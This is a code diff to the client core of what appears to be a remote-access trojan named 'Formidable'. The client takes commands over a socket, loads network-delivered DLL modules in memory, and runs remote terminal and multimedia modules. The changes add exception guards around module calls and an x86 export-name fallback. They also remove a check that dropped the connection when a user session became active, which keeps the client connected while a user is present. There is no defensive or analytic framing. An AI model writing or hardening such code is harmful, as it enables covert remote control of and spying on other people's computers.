@@ -25,6 +25,31 @@ namespace Formidable {
     CRITICAL_SECTION g_TerminalMutex;
     CRITICAL_SECTION g_MultimediaMutex;
 
+    // 安全调用模块入口
+    void SafeCallModuleEntry(PFN_MODULE_ENTRY pEntry, SOCKET s, CommandPkg* pkg) {
+        __try {
+            pEntry(s, pkg);
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            OutputDebugStringA("[ClientCore] Exception in ModuleEntry!\n");
+#ifdef _DEBUG
+            MessageBoxA(NULL, "Exception in ModuleEntry!", "Crash", MB_OK | MB_ICONERROR);
+#endif
+        }
+    }
+
+    // 尝试获取导出函数 (兼容 x86 stdcall 修饰名)
+    FARPROC TryGetProcAddress(HMEMORYMODULE hMod, const char* name, int argSize) {
+        FARPROC p = MemoryGetProcAddress(hMod, name);
+        if (p) return p;
+#ifdef _X86_
+        char buf[64];
+        sprintf_s(buf, "_%s@%d", name, argSize);
+        p = MemoryGetProcAddress(hMod, buf);
+#endif
+        return p;
+    }
+
     void InitClientCore() {
         InitializeCriticalSection(&g_ModuleMutex);
         InitializeCriticalSection(&g_TerminalMutex);
@@ -161,9 +186,9 @@ namespace Formidable {
                     runPkg.cmd = effectiveCmd;
                     runPkg.arg1 = 1;
                     runPkg.arg2 = 0;
-                    g_pMultimediaEntry(s, &runPkg);
+                    SafeCallModuleEntry(g_pMultimediaEntry, s, &runPkg);
                 } else {
-                    g_pMultimediaEntry(s, pkg);
+                    SafeCallModuleEntry(g_pMultimediaEntry, s, pkg);
                 }
             }
             LeaveCriticalSection(&g_MultimediaMutex);
@@ -176,14 +201,15 @@ namespace Formidable {
 
         HMEMORYMODULE hMod = MemoryLoadLibrary(dllData, dllSize);
         if (hMod) {
-            PFN_MODULE_ENTRY pEntry = (PFN_MODULE_ENTRY)MemoryGetProcAddress(hMod, "ModuleEntry");
+            // ModuleEntry has 2 args (SOCKET, CommandPkg*), so 8 bytes on x86
+            PFN_MODULE_ENTRY pEntry = (PFN_MODULE_ENTRY)TryGetProcAddress(hMod, "ModuleEntry", 8);
             if (pEntry) {
                 if (effectiveCmd == CMD_TERMINAL_OPEN) {
                     EnterCriticalSection(&g_TerminalMutex);
                     g_hTerminalModule = hMod;
                     g_pTerminalEntry = pEntry;
                     LeaveCriticalSection(&g_TerminalMutex);
-                    pEntry(s, pkg); 
+                    SafeCallModuleEntry(pEntry, s, pkg); 
                     return; 
                 }
                 if (isMultimedia) {
@@ -195,7 +221,7 @@ namespace Formidable {
                     runPkg.cmd = effectiveCmd;
                     runPkg.arg1 = 1;
                     runPkg.arg2 = 0;
-                    pEntry(s, &runPkg);
+                    SafeCallModuleEntry(pEntry, s, &runPkg);
                     return;
                 }
 
@@ -215,7 +241,7 @@ namespace Formidable {
                 runPkg.cmd = moduleKey;
                 runPkg.arg1 = 0; 
                 runPkg.arg2 = 0;
-                pEntry(s, &runPkg);
+                SafeCallModuleEntry(pEntry, s, &runPkg);
                 return;
             }
             MemoryFreeLibrary(hMod);
@@ -420,13 +446,13 @@ namespace Formidable {
                 break;
             case CMD_TERMINAL_DATA:
                 EnterCriticalSection(&g_TerminalMutex);
-                if (g_pTerminalEntry) g_pTerminalEntry(s, pkg);
+                if (g_pTerminalEntry) SafeCallModuleEntry(g_pTerminalEntry, s, pkg);
                 LeaveCriticalSection(&g_TerminalMutex);
                 break;
             case CMD_TERMINAL_CLOSE:
                 EnterCriticalSection(&g_TerminalMutex);
                 if (g_pTerminalEntry) {
-                    g_pTerminalEntry(s, pkg);
+                    SafeCallModuleEntry(g_pTerminalEntry, s, pkg);
                     if (g_hTerminalModule) {
                         MemoryFreeLibrary(g_hTerminalModule);
                         g_hTerminalModule = NULL;
@@ -454,7 +480,7 @@ namespace Formidable {
                 if (it != g_ModuleEntryCache.end()) {
                     PFN_MODULE_ENTRY pEntry = it->second;
                     LeaveCriticalSection(&g_ModuleMutex);
-                    pEntry(s, pkg);
+                    SafeCallModuleEntry(pEntry, s, pkg);
                 } else {
                     LeaveCriticalSection(&g_ModuleMutex);
                     LoadModuleFromMemory(s, pkg, totalDataLen);
@@ -475,11 +501,6 @@ namespace Formidable {
         
         std::thread heartbeatThread([ctx]() {
             while (!ctx->bShouldExit->load() && ctx->bConnected->load()) {
-                if (g_IsService && IsUserSessionActive()) {
-                    ctx->bShouldExit->store(true);
-                    closesocket(ctx->s);
-                    break;
-                }
                 Sleep(30000);
                 if (!ctx->bConnected->load() || ctx->bShouldExit->load()) break;
                 
